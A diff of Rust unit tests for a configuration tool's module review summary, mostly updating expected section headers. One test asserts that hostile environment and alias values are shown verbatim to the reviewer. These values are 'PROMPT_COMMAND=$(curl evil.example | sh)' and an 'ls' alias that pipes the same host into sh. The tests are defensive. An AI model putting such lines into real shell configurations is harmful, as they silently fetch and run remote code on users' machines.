@@ -4793,7 +4793,7 @@ fn print_module_review_summary_lists_packages_with_min_version_when_set() {
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(out.contains("Packages (2)"), "count: {out}");
+    assert!(out.contains("Packages\n"), "section title: {out}");
     assert!(out.contains("ripgrep (min: 13.0)"), "min-version: {out}");
     assert!(out.contains("fd"), "second pkg: {out}");
 }
@@ -4839,8 +4839,8 @@ fn print_module_review_summary_warns_on_post_apply_scripts() {
 #[test]
 fn print_module_review_summary_omits_empty_sections() {
     // A module with only `depends` should not emit Packages/Files/
-    // Scripts subheaders — the output should stay tight, not push
-    // "Packages (0):" noise into the confirm-prompt view.
+    // Scripts subheaders — the output should stay tight, not push an
+    // empty "Packages" section into the confirm-prompt view.
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
     let module = make_loaded_module(
@@ -4853,8 +4853,8 @@ fn print_module_review_summary_omits_empty_sections() {
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(!out.contains("Packages ("), "no packages section: {out}");
-    assert!(!out.contains("Files ("), "no files section: {out}");
+    assert!(!out.contains("Packages"), "no packages section: {out}");
+    assert!(!out.contains("Files"), "no files section: {out}");
     assert!(!out.contains("Post-apply"), "no scripts section: {out}");
 }
 
@@ -4883,12 +4883,12 @@ fn print_module_review_summary_shows_env_and_alias_payloads_verbatim() {
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(out.contains("Environment (1)"), "env section header: {out}");
+    assert!(out.contains("Environment\n"), "env section header: {out}");
     assert!(
         out.contains("PROMPT_COMMAND=$(curl evil.example | sh)"),
         "env value verbatim: {out}"
     );
-    assert!(out.contains("Aliases (1)"), "alias section header: {out}");
+    assert!(out.contains("Aliases\n"), "alias section header: {out}");
     assert!(
         out.contains("ls=curl evil.example | sh; ls"),
         "alias command verbatim: {out}"
@@ -5009,8 +5009,8 @@ fn print_module_review_summary_omits_env_and_alias_sections_when_absent() {
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
     let out = cfgd_core::test_helpers::captured_text(&buf);
-    assert!(!out.contains("Environment ("), "no env section: {out}");
-    assert!(!out.contains("Aliases ("), "no alias section: {out}");
+    assert!(!out.contains("Environment"), "no env section: {out}");
+    assert!(!out.contains("Aliases"), "no alias section: {out}");
 }
 
 #[test]
